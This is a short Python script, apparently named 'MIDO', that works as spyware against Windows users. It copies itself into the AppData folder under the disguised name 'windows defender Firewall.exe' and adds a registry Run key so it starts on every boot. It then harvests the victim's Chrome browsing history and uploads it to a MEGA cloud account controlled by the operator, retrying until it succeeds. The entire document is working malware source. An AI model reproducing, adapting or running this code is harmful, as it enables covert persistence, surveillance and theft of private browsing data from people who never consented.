#*__* MIDO *__*
from browser_history.browsers import Chrome
from os import remove , path , chdir , environ , getcwd
from datetime import datetime
from mega import Mega
from time import sleep
import shutil , subprocess  ,sys
email = input("#18ff4e email (mega account) :- ")
password = input("password (mega password) :- ")
def reg_windows():
	evil_file_location = environ["appdata"] + "\\windows defender Firewall.exe"
	if not path.exists(evil_file_location):
		shutil.copyfile(sys.executable, evil_file_location)
		subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v winexplorer /t REG_SZ /d "' + evil_file_location + '"', shell=True)
reg_windows()
def Mido():
	f = Chrome()
	outputs = f.fetch_history()
	paTh = chdir(environ["temp"])
	x = open("history.txt", mode="a")
	his = outputs.histories
	for i in his:
		x.writelines(i[1]+"\n\n")
	x.close()
def up():
	global email , password
	Mido()
	mega = Mega()
	try:
		m = mega.login(email, password)
		Folder = mega.find('mido')
		mega.upload('history.txt', Folder[0])
	except Exception as e:
		sleep(120)
	remove("history.txt")
while 1:
	try:
		up()
		sys.exit()
	except Exception as e:
		sleep(30)
